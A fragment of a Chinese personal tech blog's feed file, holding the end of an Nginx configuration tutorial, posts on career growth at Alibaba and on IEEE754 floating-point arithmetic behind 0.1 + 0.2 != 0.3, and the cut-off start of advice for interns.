/blog/20141202-article-name.md</span></span><br><span class="line">    <span class="attribute">alias</span> /home/barret/www/blog/<span class="variable">$1</span>-<span class="variable">$2</span>.md;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首页设置</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">index</span> /html/index.html /php/index.php;</span><br></pre></td></tr></table></figure><p>重定向页面设置</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">error_page</span>    <span class="number">404</span>         /<span class="number">404</span>.html;</span><br><span class="line"><span class="attribute">error_page</span>    <span class="number">502</span>  <span class="number">503</span>    /50x.html;</span><br><span class="line"><span class="attribute">error_page</span>    <span class="number">404</span>  =<span class="number">200</span>   /1x1.gif;</span><br><span class="line"></span><br><span class="line"><span class="section">location</span> / &#123;</span><br><span class="line">    <span class="attribute">error_page</span>  <span class="number">404</span> <span class="variable">@fallback</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="section">location</span> <span class="variable">@fallback</span> &#123;</span><br><span class="line">    <span class="comment"># 将请求反向代理到上游服务器处理</span></span><br><span class="line">    <span class="attribute">proxy_pass</span> http://localhost:9000;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>try_files 设置</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">try_files</span> <span class="variable">$uri</span> <span class="variable">$uri</span>.html <span class="variable">$uri</span>/index.html <span class="variable">@other</span>;</span><br><span class="line"><span class="section">location</span> <span class="variable">@other</span> &#123;</span><br><span class="line">    <span class="comment"># 尝试寻找匹配 uri 的文件，失败了就会转到上游处理</span></span><br><span class="line">    <span class="attribute">proxy_pass</span>  http://localhost:9000;</span><br><span class="line">&#125;</span><br><span class="line"><span class="section">location</span> / &#123;</span><br><span class="line">    <span class="comment"># 尝试寻找匹配 uri 的文件，没找到直接返回 502</span></span><br><span class="line">    <span class="attribute">try_files</span> <span class="variable">$uri</span> <span class="variable">$uri</span>.html =<span class="number">502</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Nginx-配置反向代理服务器"><a href="#Nginx-配置反向代理服务器" class="headerlink" title="Nginx 配置反向代理服务器"></a>Nginx 配置反向代理服务器</h3><p>反向代理（reserve proxy）方式是指用代理服务器来接受 Internet 上的连接请求，然后将请求转发给内部网络中的上游服务器，并将上游服务器上得到的结果返回给 Internet 上请求连接的客户端，此时代理服务器对外的表现就是一个 Web 服务器。</p><p>Nginx 具备超强的高并发高负载能力，一般会作为前端的服务器直接向客户端提供静态文件服务；而业务一般还包含一些业务逻辑需要 Apache、Tomcat 等服务器来处理，故通常 Nginx 对外表现即为静态 Web 服务器也是反向代理服务器。</p><p>缺点是增加了一次请求的处理时间，优点是降低了上游服务器的负载，尽量将压力放在 Nginx 服务器上。</p><p><strong>1、负载均衡配置</strong></p><p>upstream，定义一个上游服务器集群</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">upstream</span> backend &#123;</span><br><span class="line">    <span class="comment"># ip_hash;</span></span><br><span class="line">    <span class="attribute">server</span> s1.barretlee.com;</span><br><span class="line">    <span class="attribute">server</span> s2.barretlee.com;</span><br><span class="line">&#125;</span><br><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="section">location</span> / &#123;</span><br><span class="line">        <span class="attribute">proxy_pass</span> http://backend;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>2、反向代理</strong></p><p>proxy_pass 将请求转发到有处理能力的端上，默认不会转发请求中的 Host 头部</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">location</span> /blog &#123;</span><br><span class="line">    <span class="attribute">prox_pass</span> http://localhost:9000;</span><br><span class="line"></span><br><span class="line">    <span class="comment">### 下面都是次要关注项</span></span><br><span class="line">    <span class="attribute">proxy_set_header</span> Host <span class="variable">$host</span>;</span><br><span class="line">    <span class="attribute">proxy_method</span> POST;</span><br><span class="line">    <span class="comment"># 指定不转发的头部字段</span></span><br><span class="line">    <span class="attribute">proxy_hide_header</span> Cache-Control;</span><br><span class="line">    <span class="attribute">proxy_hide_header</span> Other-Header;</span><br><span class="line">    <span class="comment"># 指定转发的头部字段</span></span><br><span class="line">    <span class="attribute">proxy_pass_header</span> Server-IP;</span><br><span class="line">    <span class="attribute">proxy_pass_header</span> Server-Name;</span><br><span class="line">    <span class="comment"># 是否转发包体</span></span><br><span class="line">    <span class="attribute">proxy_pass_request_body</span> <span class="literal">on</span> | <span class="literal">off</span>;</span><br><span class="line">    <span class="comment"># 是否转发头部</span></span><br><span class="line">    <span class="attribute">proxy_pass_request_headers</span> <span class="literal">on</span> | <span class="literal">off</span>;</span><br><span class="line">    <span class="comment"># 显形/隐形 URI，上游发生重定向时，Nginx 是否同步更改 uri</span></span><br><span class="line">    <span class="attribute">proxy_redirect</span> <span class="literal">on</span> | <span class="literal">off</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="一个简单的例子，Node-js"><a href="#一个简单的例子，Node-js" class="headerlink" title="一个简单的例子，Node.js"></a>一个简单的例子，Node.js</h3><p>一个十分常见的需求：处理请求，如果是静态文件，Nginx 直接返回，否则交给 Node 服务器处理。首先创建了一个 Node 服务器：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> http = <span class="built_in">require</span>(<span class="string">&#x27;http&#x27;</span>);</span><br><span class="line">http.<span class="title function_">createServer</span>(<span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">end</span>(<span class="string">&#x27;hello world&#x27;</span>);</span><br><span class="line">&#125;).<span class="title function_">listen</span>(<span class="number">9000</span>);</span><br></pre></td></tr></table></figure><p>任何请求过来都返回 <code>hello world</code>，简版的 Nginx 配置如下，</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">events</span> &#123;</span><br><span class="line">    <span class="comment"># 这里可不写东西</span></span><br><span class="line">    <span class="attribute">use</span> <span class="literal">epoll</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="section">http</span> &#123;</span><br><span class="line">    <span class="section">server</span> &#123;</span><br><span class="line">        <span class="attribute">listen</span> <span class="number">127.0.0.1:8888</span>;</span><br><span class="line">        <span class="comment"># 如果请求路径跟文件路径按照如下方式匹配找到了，直接返回</span></span><br><span class="line">        <span class="attribute">try_files</span> <span class="variable">$uri</span> <span class="variable">$uri</span>/index.html;</span><br><span class="line">        <span class="section">location</span> <span class="regexp">~* ^/(js|css|image|font)/$</span> &#123;</span><br><span class="line">            <span class="comment"># 静态资源都在 static 文件夹下</span></span><br><span class="line">            <span class="attribute">root</span> /home/barret/www/static/;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="section">location</span> /app &#123;</span><br><span class="line">            <span class="comment"># Node.js 在 9000 开了一个监听端口</span></span><br><span class="line">            <span class="attribute">proxy_pass</span> http://127.0.0.1:9000;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment"># 上面处理出错或者未找到的，返回对应状态码文件</span></span><br><span class="line">        <span class="attribute">error_page</span>    <span class="number">404</span>            /<span class="number">404</span>.html;</span><br><span class="line">        <span class="attribute">error_page</span>    <span class="number">502</span>  <span class="number">503</span>  <span class="number">504</span>  /50x.html;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先 try_files，尝试直接匹配文件；没找到就匹配静态资源；还没找到就交给 Node 处理；否则就返回 4xx&#x2F;5xx 的状态码。</p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>本文内容为阅读《深入理解 Nginx 模块开发和架构解析》时做的一点笔记，以前配置 Nginx 服务器总是得上网找答案，现在把这些项都理解并记到脑子里了，还是担心忘记，博客稍作记录。</p><p>十分建议读者边阅读边动手尝试，利用 <code>nginx -t</code> 测试语法，遇到问题就 Google 搜索下，上手会很快。后续有空会详细介绍 Nginx 运维知识。</p>]]></content>
      
      
      <categories>
          
          <category> 网络交互 </category>
          
          <category> 网络技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Nginx </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>谈一谈我在阿里的成长</title>
      <link href="/blog/2016/10/21/my-growth-at-alibaba/"/>
      <url>/blog/2016/10/21/my-growth-at-alibaba/</url>
      
        <content type="html"><![CDATA[<p>前几天受阿里通信的同事邀请，分享了一个关于成长的话题。其实我不太热衷于分享此类话题，作为一个技术人，分享那些没有技术干货的内容总感觉有些怪怪的。但最后还是拟下了这个话题 ——《谈一谈我在阿里的成长》，所以本文主要是对分享的 PPT 做简述。</p><span id="more"></span><p>可以回首一下，毕业工作后的这段时间里，你做过哪些事情让自己感觉有了很大的成长？</p><p>我简单枚举了一下，主要是这几个方面：</p><p><img src="/../blogimgs/2016/10/21/65e4f1e6gw1f8zamgkq8pj20pa0e9gmd.jpg" alt="成长"><!--<source src="http://ww4.sinaimg.cn/large/65e4f1e6gw1f8zamgkq8pj20pa0e9gmd.jpg">--></p><p>涉足一个未知的领域，走进去，那就是成长；能够坚持不懈的完成一件事情，优化一个项目，那也是成长；能够沉淀方案，推广自己的想法，让更多的人收益，那也是成长；能够带领多个人去完成一个项目，那更是很不错的成长。</p><p>成长总是伴随着痛苦，因为你需要解决一个以前从未解决过的问题。你可以参考别人的处理方法，也可以自己摸索，但不管怎样，都需要硬着头破走过去，破茧成蝶，那才能成长。</p><p>工作之后，能够支配的时间越来越少了，尤其是在互联网行业，或许你每天就是在加班加点中度过，每每回到家，就只想苟延残喘一下，好好躺着，闭上眼睛迎接苦逼的第二天，就不用说什么利用闲暇时间搞搞研究，提升下自己了。 <strong>所以会时常把成长这件事情放在公司，希望在工作中提升自己。</strong>下面我来聊一聊，我是如何在工作中提升自己的，当然，只是抛砖引玉，更希望阁下能够在文章下方分享更多成长的「秘诀」。</p><h3 id="业务中的成长"><a href="#业务中的成长" class="headerlink" title="业务中的成长"></a>业务中的成长</h3><p>这一块可以分为两个部分：技术能力 + 业务能力。</p><p>技术能力又可以分为编程能力、架构能力和工程能力，我们不讨论那么复杂，一言以蔽之，就是解决问题的能力。我就以之前做过的淘宝首页为例吧，</p><p><img src="/../blogimgs/2016/10/21/65e4f1e6gw1f8zb1946y3j20p80e5mzf.jpg" alt="淘宝首页"><!--<source src="http://ww2.sinaimg.cn/large/65e4f1e6gw1f8zb1946y3j20p80e5mzf.jpg">--></p><p>接手淘宝首页之后，我分析了业务中存在的问题，针对罗列出来的问题，逐个击破：</p><ul><li>平台问题：不断地用 issue 来轰炸平台的维护者，暴露问题，推动解决问题</li><li>开发环境：通过优化流程和开发工具，提升效率</li><li>沟通问题：指定规则，减少沟通成本，添加运营辅助工具，帮助他们解决问题</li><li>依赖系统：分清强弱依赖关系，强依赖转化为弱依赖，弱依赖转化为无依赖，添加多重监控和错误布点，及时警报发现问题</li><li>高风险：找多人 review 整体架构，做好风险预案，做好上线前自动化检测等</li></ul><p>当我们梳理完这些问题，并一个一个地处理好之后，成长自然就体现出来了。这个时间还是颇为漫长的，用了一年半的时间，从刚开始的唯唯诺诺、畏首畏尾，变得游刃有余、处变不惊。</p><p>以上更多的是使用技术手段来解决问题，而业务能力的提升，需要我们走进业务：</p><p><img src="/../blogimgs/2016/10/21/65e4f1e6gw1f8zb97yvttj20pa0e6dgg.jpg" alt="行业业务"><!--<source src="http://ww4.sinaimg.cn/large/65e4f1e6gw1f8zb97yvttj20pa0e6dgg.jpg">--></p><p>首先，必须明确产品和运营的目标是什么，最直接的方式就是询问他们近一个阶段的 KPI，了解产品面向的用户群体，迭代上线的节奏，每期迭代的具体目标，包括整个产品的思路，以及运营方式等等。</p><p>了解整个产品的全貌后，你才能走进业务，站在业务方的角度掷地有声的「砍需求」。数据是业务的死穴，你看清了产品，掌握了产品的数据，就能够清楚体会到，这个产品经理是在正儿八经搞项目，还是为了糊弄他的老板，随便画上几页 PRD 打发时间。</p><p>当然，参与到业务的沟通也是一件很有意思的事情，你可以跟着运营学运营技能，也可以跟着产品学习产品技能，真正走进业务，也会有很多的成长。</p><p>除此之外，你还可以主动担任项目经理，把握风险、提高协同，帮助产品如期上线。这里面需要很多的沟通和思考，十分锻炼人。</p><h3 id="业务之外的成长"><a href="#业务之外的成长" class="headerlink" title="业务之外的成长"></a>业务之外的成长</h3><p>如果你身处四五十甚至更多人的大团队，那么恭喜你，一定要好好珍惜整个大团队的带来的技术氛围。</p><p>因为在团队中，除了做业务的同时外，一定还有不少搞性能优化、做流程、做架构、做中间件等等的同事，你做的东西可能跟他们没有太多的交集，但千万不能错过与这些人交流的机会。下班之后，如果发现一两个同学没走，赶紧凑过去，跟他沟通下业务，交流下技术，坎一坎人生，聊一聊理想。这么聊着聊着，半年时间，你就收获：</p><ul><li>一群可以扯淡的同事，闲暇时间不会寂寞</li><li>了解整个团队的全貌，而且还会看到团队的一些问题，甚至会冒出一些想法</li><li>掌握很多很多的技术细节，你可能很少有场景去踩这些坑，但是同事可以传授给你</li></ul><p>当然，如果你想拿到成绩，还是需要回归到业务，反哺团队。</p><p><img src="/../blogimgs/2016/10/21/65e4f1e6gw1f8zbqzzdqaj20p50e63za.jpg" alt="Owner 一件事情"><!--<source src="http://ww1.sinaimg.cn/large/65e4f1e6gw1f8zbqzzdqaj20p50e63za.jpg">--></p><p>如果你有想法，并且准备 Owner 起一件事情，你可以这么做：</p><ol><li>不断抛出问题，然后不断抛出这些问题的解决方案，并落实</li><li>拉人进来提问题，让他们帮忙解决这些问题</li><li>汇总所有的问题，规划时间和目标，形成小组并定期汇报</li><li>沉淀方案，推广方案，让更多人受益并持续跟进</li></ol><p>实际上，第一步开始，你就已经开始 owner 这件事情了。</p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>本文从业务内外两个角度，回顾了一下我在阿里待了两年多的一些成长和感受，希望能够引发你的思考，更希望你可以在文章下方留言，分享你的成长；）</p>]]></content>
      
      
      <categories>
          
          <category> 观点和感想 </category>
          
          <category> 笔记本 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 成长 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>揭秘 0.1 + 0.2 != 0.3</title>
      <link href="/blog/2016/09/28/ieee754-operation-in-js/"/>
      <url>/blog/2016/09/28/ieee754-operation-in-js/</url>
      
        <content type="html"><![CDATA[<p>“0.1 + 0.2 &#x3D; ?”，这道题如果给小学生，他会立马告诉你答案是 0.3，但是交给一些程序去计算，结果就不是那么简单了。</p><p><img src="/../blogimgs/2016/09/28/6c0378f8gw1f89pd8hm96j20p00dwacm.jpg" alt="math"><!--<source src="http://ww4.sinaimg.cn/large/6c0378f8gw1f89pd8hm96j20p00dwacm.jpg">--></p><span id="more"></span><p>事实上，不仅仅是 JS，在其他采用 IEEE754 浮点数标准的语言中，0.1 + 0.2 都不会等于 0.3，但是 0.2 + 0.3 却等于 0.5，这是为何？想必这类问题也困扰着不少程序员。</p><h3 id="IEEE754-浮点数的演算"><a href="#IEEE754-浮点数的演算" class="headerlink" title="IEEE754 浮点数的演算"></a>IEEE754 浮点数的演算</h3><p>我们知道，科学计数法中 30000 可以写成 3x10<sup>4</sup>，以 10 为底数 4 为指数的科学计数法。在 IEEE754 标准中是比较类似的，只不过它是二进制数，底数也为 2。</p><p>IEEE 754 中最常用的浮点数值表示法是：单精确度（32位）和双精确度（64位），JavaScript 采用的是后者。举个例子，十进制数 150，使用双精度浮点数表示法，表示如下：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// D 表示十进制，B 表示二进制</span></span><br><span class="line">150D = <span class="number">2</span>^<span class="number">8</span> * <span class="number">0.</span>1001011B <span class="comment">// 后面省略了 46 个 0</span></span><br></pre></td></tr></table></figure><p>可以通过短除法计算：</p><figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line"><span class="code">   150   余数位</span></span><br><span class="line"><span class="section">÷    2</span></span><br><span class="line"><span class="section">---------------</span></span><br><span class="line"><span class="code">    75     0   </span></span><br><span class="line"><span class="section">÷    2</span></span><br><span class="line"><span class="section">---------------</span></span><br><span class="line"><span class="code">    37     1</span></span><br><span class="line"><span class="section">÷    2</span></span><br><span class="line"><span class="section">---------------</span></span><br><span class="line"><span class="code">    18     1</span></span><br><span class="line"><span class="section">÷    2</span></span><br><span class="line"><span class="section">---------------</span></span><br><span class="line"><span class="code">     9     0</span></span><br><span class="line"><span class="section">÷    2</span></span><br><span class="line"><span class="section">---------------</span></span><br><span class="line"><span class="code">     4     1</span></span><br><span class="line"><span class="section">÷    2</span></span><br><span class="line"><span class="section">---------------</span></span><br><span class="line"><span class="code">     2     0</span></span><br><span class="line"><span class="section">÷    2</span></span><br><span class="line"><span class="section">---------------</span></span><br><span class="line"><span class="code">     1     0</span></span><br><span class="line"><span class="section">÷    2</span></span><br><span class="line"><span class="section">---------------</span></span><br><span class="line"><span class="code">     0     1</span></span><br></pre></td></tr></table></figure><p>最后一个余数为高位值，于是拿到 150 对应的二进制数位 <code>1001011</code>，也就等于 <code>2^8 * 0.1001011</code>。</p><p>上面是整数的表示法，而小数的表示法采用的是乘二取整，如 0.1，它的二进制表示为：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// (0011) 表示循环</span></span><br><span class="line"><span class="number">0.</span>1D = <span class="number">2</span>^-<span class="number">3</span> * <span class="number">0.110011</span>(<span class="number">0011</span>)</span><br></pre></td></tr></table></figure><p>其演算方法如下：</p><figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line"><span class="code">    0.1   整数位</span></span><br><span class="line"><span class="section">×     2</span></span><br><span class="line"><span class="section">---------------</span></span><br><span class="line"><span class="code">    0.2     0 </span></span><br><span class="line"><span class="section">×     2</span></span><br><span class="line"><span class="section">---------------</span></span><br><span class="line"><span class="code">    0.4     0   * ↓</span></span><br><span class="line"><span class="section">×     2</span></span><br><span class="line"><span class="section">---------------</span></span><br><span class="line"><span class="code">    0.8     0 </span></span><br><span class="line"><span class="section">×     2</span></span><br><span class="line"><span class="section">---------------</span></span><br><span class="line"><span class="code">    1.6     1 </span></span><br><span class="line"><span class="section">×     2</span></span><br><span class="line"><span class="section">---------------</span></span><br><span class="line"><span class="code">    1.2     1</span></span><br><span class="line"><span class="section">×     2</span></span><br><span class="line"><span class="section">---------------</span></span><br><span class="line"><span class="code">    0.4     0   * ↑</span></span><br><span class="line"><span class="code">             (0011循环)</span></span><br></pre></td></tr></table></figure><p>与整数不同的是，第一个计算得到的整数位为最高位，故 0.1 对应的二进制数为 <code>0.000110011(0011)</code>，也就等于 <code>2^-3 0.1100110011(0011)</code>。</p><p>如果一个数既包含整数部分，又包含小数部分，其表示法的计算，需要分拆为整数和小数两部分，然后相加得到结果。</p><h3 id="IEEE754-浮点数精度丢失"><a href="#IEEE754-浮点数精度丢失" class="headerlink" title="IEEE754 浮点数精度丢失"></a>IEEE754 浮点数精度丢失</h3><p>IEEE754 浮点数表示法的数据格式如下图：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 下图采用大端表示，高位在左，低位在右。</span></span><br><span class="line"></span><br><span class="line">sign  exponent         fraction</span><br><span class="line">+---+----------+---------------------+</span><br><span class="line">| <span class="number">1</span> |   <span class="number">2</span>~<span class="number">12</span>   |         <span class="number">13</span>~<span class="number">64</span>       |</span><br><span class="line">+---+----------+---------------------+</span><br></pre></td></tr></table></figure><ul><li>符号位：高位第 1 位，如图 sign 部分</li><li>指数位：高位第 2~12 位，如图 exponent 部分</li><li>尾数位：剩下的 fraction 部分</li></ul><p>从上面小数的乘二取整演算中可以看到，有些小数对应的二进制数是无法写全的，比如 0.1，而 fraction 尾数部分有要求，只允许 52 位，超过部分进一舍零。</p><p>那么，我们就可以得到：</p><figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line">0.1D </span><br><span class="line"><span class="section">= 2^-4 * 1.10011(0011)B</span></span><br><span class="line"><span class="section">= 2^-4 * 1.10011(0011 repeat 12 times)0011B // ← 最后一位为 1，进 1</span></span><br><span class="line"><span class="section">= 2^-4 * 1.10011(0011 repeat 12 times)010B</span></span><br></pre></td></tr></table></figure><h3 id="揭秘-0-1-0-2"><a href="#揭秘-0-1-0-2" class="headerlink" title="揭秘 0.1 + 0.2"></a>揭秘 0.1 + 0.2</h3><p>根据上面我们了解到的知识，我们可以很容易算出这些值：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="number">0.</span>1D = <span class="number">2</span>^-<span class="number">4</span> * <span class="number">1.</span>1001100110011001100110011001100110011001100110011010B</span><br><span class="line"><span class="number">0.</span>2D = <span class="number">2</span>^-<span class="number">3</span> * <span class="number">1.</span>1001100110011001100110011001100110011001100110011010B</span><br><span class="line"><span class="number">0.</span>3D = <span class="number">2</span>^-<span class="number">2</span> * <span class="number">1.</span>0011001100110011001100110011001100110011001100110011B</span><br></pre></td></tr></table></figure><p><code>0.1 + 0.2</code> 时，先将两者指数统一为 -3，故 0.1 小数点向左移一位，于是：</p><figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line"><span class="code">   0.1100110011001100110011001100110011001100110011001101B</span></span><br><span class="line"><span class="section">+  1.1001100110011001100110011001100110011001100110011010B</span></span><br><span class="line"><span class="section">------------------------------------------------------------</span></span><br><span class="line"><span class="section">= 10.0110011001100110011001100110011001100110011001100111B</span></span><br></pre></td></tr></table></figure><p>得到的二进制数为：</p><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">10</span>.<span class="number">0110011001100110011001100110011001100110011001100111</span>B</span><br></pre></td></tr></table></figure><p>小数点往左移一位使得整数部分为 1，此时尾数部分为 53 位，进一舍零，于是得到最后的值是：</p><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">2</span>^-<span class="number">2</span> * <span class="number">1</span>.<span class="number">0011001100110011001100110011001100110011001100110100</span></span><br></pre></td></tr></table></figure><p>这个值转化成真值，结果为：<code>0.30000000000000004</code>。那么 <code>0.1 + 0.2 = 0.30000000000000004</code> 的推演到这里就结束了。</p><h3 id="相关验证"><a href="#相关验证" class="headerlink" title="相关验证"></a>相关验证</h3><p>毕竟咱们手动计算可能存在笔误，可以通过一个叫做 <code>double-bits</code> 的 npm 进行推演，我写了一个小 demo，感兴趣的可以玩耍下：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> db = <span class="built_in">require</span>(<span class="string">&#x27;double-bits&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> pad = <span class="built_in">require</span>(<span class="string">&#x27;pad&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// [lo, hi] where lo is a 32 bit integer and hi is a 20 bit integer.</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">base2Str</span> = (<span class="params">n</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> f = db.<span class="title function_">fraction</span>(n);</span><br><span class="line">  <span class="keyword">const</span> s = db.<span class="title function_">sign</span>(n) ? <span class="string">&#x27;-&#x27;</span> : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  <span class="keyword">const</span> e = <span class="string">`2^<span class="subst">$&#123;db.exponent(n) + <span class="number">1</span>&#125;</span>`</span>;</span><br><span class="line">  <span class="keyword">const</span> t = <span class="string">`0.<span class="subst">$&#123;pad(f[<span class="number">1</span>].toString(<span class="number">2</span>), <span class="number">20</span>, <span class="string">&#x27;0&#x27;</span>)&#125;</span><span class="subst">$&#123;pad(f[<span class="number">0</span>].toString(<span class="number">2</span>), <span class="number">32</span>, <span class="string">&#x27;0&#x27;</span>)&#125;</span>`</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`<span class="subst">$&#123;s&#125;</span><span class="subst">$&#123;e&#125;</span> * <span class="subst">$&#123;t&#125;</span>`</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">base2Str</span>(<span class="number">0.1</span>).<span class="title function_">toString</span>(<span class="number">2</span>));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">base2Str</span>(<span class="number">0.2</span>).<span class="title function_">toString</span>(<span class="number">2</span>));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">base2Str</span>(<span class="number">0.3</span>).<span class="title function_">toString</span>(<span class="number">2</span>));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">base2Str</span>(<span class="number">1.2</span>).<span class="title function_">toString</span>(<span class="number">2</span>));</span><br></pre></td></tr></table></figure><p>上面输出结果为：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="number">2</span>^-<span class="number">3</span> * <span class="number">0.11001100110011001100110011001100110011001100110011010</span></span><br><span class="line"><span class="number">2</span>^-<span class="number">2</span> * <span class="number">0.11001100110011001100110011001100110011001100110011010</span></span><br><span class="line"><span class="number">2</span>^-<span class="number">1</span> * <span class="number">0.10011001100110011001111001100110011001100110011001100</span></span><br><span class="line"><span class="number">2</span>^<span class="number">1</span> * <span class="number">0.10011001100110011001111001100110011001100110011001100</span></span><br></pre></td></tr></table></figure><h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><p>为了按照计算机的思维，IEEE754 的标准来计算 <code>0.1 + 0.2</code>，又重新复习了一遍大学计算机基础的知识，原码、反码、补码，以及除二取余、乘二取整计算法，最后能够推演出来，也算是一个胜利吧~</p><h3 id="更多阅读"><a href="#更多阅读" class="headerlink" title="更多阅读"></a>更多阅读</h3><ul><li><a href="http://www.h-schmidt.net/FloatConverter/IEEE754.html">IEEE 754 Converter</a></li><li><a href="https://zh.wikipedia.org/wiki/IEEE_754">维基百科 IEEE 754</a></li></ul><hr><p>题图：<a href="https://unsplash.com/search/math?photo=5mZ_M06Fc9g">math</a> by Roman Mager</p><p><em><strong>笔耕不辍，欢迎关注微信公众号小胡子哥（barretlee_com），分享生活，分享技术，我在那里等你。</strong></em></p>]]></content>
      
      
      <categories>
          
          <category> 前端杂烩 </category>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IEEE754 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何做好一名实习生</title>
      <link href="/blog/2016/09/27/how-to-be-a-excellent-intern/"/>
      <url>/blog/2016/09/27/how-to-be-a-excellent-intern/</url>
      
        <content type="html"><![CDATA[<p>最近看到有几个同事准备着转正，想借此机会聊一下实习生相关的话题——如何成为一名优秀的实习生。</p><span id="more"></span><p><img src="/../blogimgs/2016/09/27/6c0378f8gw1f87ht68ivnj20p00dwjv5.jpg" alt="intern"><!--<source src="http://ww2.sinaimg.cn/large/6c0378f8gw1f87ht68ivnj20p00dwjv5.jpg">--></p><h3 id="公司为什么需要实习生"><a href="#公司为什么需要实习生" class="headerlink" title="公司为什么需要实习生"></a>公司为什么需要实习生</h3><p>如果你认为公司招聘实习生，就是为了攫取优质的廉价劳动力，随意安排些杂七杂八的琐碎事，那可就大错特错了。</p><p>公司人才入口一般有两个渠道，社招和校招。社招成本向来都很高，得花大价钱好不容易抓来一个资深人士，搞不好还是一根「老油条」；而学生不太一样，没有经过太多外界文化的洗礼，大部分成天在大学里泡着电脑，打字速度和编程能力都是相当的可以，这类同学稍加培育，摇身一变就能成为专业人士。</p><p>要知道，熟悉公司的环境是需要一段时间的。在这段时间里，公司对待实习生和社招人员的要求和态度不太一样，前者可以潜心钻研技术并且融入公司环境，而后者除了需要融入环境，还要承担业务的压力，两者对比效果可想而知。在实习过程中，公司可以通过观察实习生的品质、能力和其他综合能力，从而决定实习生的去留，整个抉择还是比较果断的；但是对社招人员，劝退一个人的成本很高。</p><p>需要注意的是，将实习生当临时工&#x2F;兼职工的公司也是存在的，同学们需要擦亮双眼，好好甄别。</p><h3 id="如何做好一名实习生"><a href="#如何做好一名实习生" class="headerlink" title="如何做好一名实习生"></a>如何做好一名实习生</h3><p>当你踏进公司的那一刻，说明你已经具备了某些留在这家公司的潜质。实习的这段时间，你的任务就是挖掘自己、提升能力、适应环境，甚至可以尝试去改变所处的环境。下面我列举几点，我对「如何做好一名实习生」的看法：</p><p><strong>1、说出来，表达出来</strong></p><p>如同你当年进入大学一样，高考拿到了十分优异的成绩，而在大学里的佼佼者面前依然显得颇为渺小；进入职场也是一样的，你身边的同事在这个行业身经百战，已然成为老兵，所以你在他们面前也会显得比较稚嫩。</p><p>如果遇到不懂的问题或者不爽的事情，在老兵面前，不需要隐忍不言，更不能不懂装懂。有什么就说什么，有不懂就问，实习期犯下的错误是你踏入这家公司后成本最低的，这种机会不要浪费。</p><p><strong>2、承认自己的错误</strong></p><p>一定要明确，你是实习生，普通的犯错公司都是完全可以容忍的；错了就是错了，就坦诚地承认，不要说「没人告诉我，我也不知道」云云，这种话说出来没有任何意义，除了增加了同事对你的不信任感。愿意承认自己的错误，别人才愿意指出你的问题，学会以人为鉴。</p><p><strong>3、注意细节</strong></p><p>每一个细节都是往后转正的加分项。比如 Word 